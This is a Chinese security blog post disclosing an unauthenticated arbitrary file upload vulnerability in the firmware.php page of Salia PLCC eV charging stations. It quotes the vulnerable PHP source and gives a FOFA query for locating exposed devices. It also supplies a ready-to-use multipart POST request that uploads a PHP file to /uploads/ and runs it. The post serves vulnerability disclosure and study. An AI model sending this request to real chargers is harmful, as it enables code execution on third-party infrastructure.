---
title: "Salia PLCC firmware.php 任意文件上传漏洞"
source: https://mrxn.net/jswz/salia-firmware-upload-rce.html
asset_dir: assets/salia-plcc-firmware.php-任意文件上传漏洞
---

# Salia PLCC firmware.php 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/1 08:17
* 849浏览
* [0评论](#comment)
* 34分钟阅读

深入探索

Firmware

firmware

授权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Salia PLCC 的 eCHARGE 系列提供适用于家庭、企业和公共场所的智能电动汽车充电解决方案，具备高效充电、动态负载管理和光伏系统集成等功能的充电站。其充电管理系统 `firmware.php` 存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，允许未授权攻击者利用此漏洞向服务器上传任意文件，如 php 文件进行[代码执行](https://mrxn.net/tag/rce)获取系统权限。

消费类电子产品

# 影响版本

<=2.2.0（最新版）

# fofa语法

> `"Salia PLCC"`

# 漏洞分析

看下 `firmware.php` 的业务逻辑实现，如下

```
<?php
    try{
        if($_SERVER['REQUEST_METHOD']=='POST'){
            $uploadManager=new \UploadManager\Upload('media');
            $chunks=$uploadManager->upload('uploads');
            if(!empty($chunks)){
                foreach($chunks as $chunk){
                    echo '<br><b>';
                    echo '<p>'.$chunk->getNameWithExtension().$lang->tx('!upload1').'</p>';
                    echo '<br>';
                    echo '<p>'.$lang->tx('!upload2').'</p>';
                    echo '<br></b>';

                    $fw_install = True;

                    // Start Firmware Update

                    // mqtt message mit update und filename raus
                    // file ist in /srv/uploads ...
                    // filename mit uebergeben ...
                    // redirect nach reboot.php ...
                    // port0/salia/updatefirmware <filename>

                    $update_ready = True;
                    $update_filename = $chunk->getNameWithExtension();
                }
            }
        }
    }catch(\UploadManager\Exceptions\Upload $exception){
        //if file exists: (user selects a file)
        if(!empty($exception->getChunk())){
            foreach($exception->getChunk()->getErrors() as $error){
                echo '<p>'.$error.'</p>';
            }
        }else{
            echo '<p>'.$exception->getMessage().'</p>';
        }
    }
?>
```

* 代码仅在请求方法为POST时执行上传逻辑。
* 使用了`\UploadManager\Upload`类处理名为`media`的上传文件。
* 调用`upload('uploads')`方法，上传文件保存到`uploads`目录

看下 `UploadManager/Upload.php` 里 upload 方法的实现

漏洞预警服务

```
public function upload($path=null,$nameWithExtension=null,$uniqueNameInPath=false,$offset=null,$length=null)
{
    //set upload path
    foreach($this->chunks as $chunk){
        if(!empty($nameWithExtension)){
            $chunk->setNameAndExtension($nameWithExtension);
        }

        //check if name is unique in that path?
        if(!empty($uniqueNameInPath)){
            $name=static::findUniqueName($path,$chunk->getName(),$chunk->getExtension());
            $chunk->setName($name);
        }

        if(empty($path)){
            $path='./';
        }

        $chunk->setSavePath($path);
    }

    //validation
    if ($this->validate() === false) {
        $message=null;
        foreach($this->errors as $error){
            $message.=$error.PHP_EOL;
        }
        throw new UploadException($message);
    }

    foreach ($this->chunks as $chunk) {
        $this->applyCallback('beforeUpload', $chunk);

        $chunk->save(null,$offset,$length);

        $this->applyCallback('afterUpload', $chunk);
    }
    return $this->chunks;
}
```

对于文件名，路径，无任何过滤或校验，导致任意[文件上传漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。总体执行流程如下图所示

网络安全

[![Salia PLCC firmware.php 任意文件上传漏洞](images/img-001-8273797a677e.webp)](https://image.mrxn.net/6ad7f43ff5514c65b05c79780b50a46a.webp)

# 漏洞复现

```
POST /firmware.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Host: salia.mrxn.net

------WebKitFormBoundary
Content-Disposition: form-data; name="media"; filename="1.php"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundary--
```

成功上传 `1.php` 文件

[![Salia PLCC firmware.php 任意文件上传漏洞](images/img-002-443561c865cd.webp)](https://image.mrxn.net/0ae3c11f08b54ef4ac5b2490c12d4e51.webp)

访问上传文件 `/uploads/1.php`

[![Salia PLCC firmware.php 任意文件上传漏洞](images/img-003-dee70c5a4b2a.webp)](https://image.mrxn.net/5b31894712024ef3be170e051812a5d3.webp)

成功执行上传代码

计算机服务器

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[Salia PLCC firmware.php 任意文件上传漏洞](https://mrxn.net/jswz/salia-firmware-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/salia-firmware-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/salia-firmware-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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